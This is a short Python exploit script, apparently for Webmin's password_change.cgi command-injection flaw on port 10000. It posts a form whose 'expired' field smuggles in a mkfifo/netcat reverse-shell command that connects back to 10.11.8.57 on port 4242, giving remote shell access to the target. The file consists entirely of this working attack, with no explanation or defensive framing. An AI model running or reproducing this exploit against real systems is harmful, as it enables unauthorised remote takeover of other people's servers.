import requests
import sys

IP = sys.argv[1]
url = f"https://{IP}:10000"
vuln_url = url + "/password_change.cgi"

headers = {"Referer": f"{url}/session_login.cgi"}
cmd = "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.8.57 4242 >/tmp/f"

payload = {
    "user": "idontknow",
    "pam": "",
    "expired": cmd,
    "old": "idontknow",
    "new1": "something",
    "new2": "something"
}
r = requests.post(vuln_url, data=payload, verify=False, headers=headers)

print(r.text)
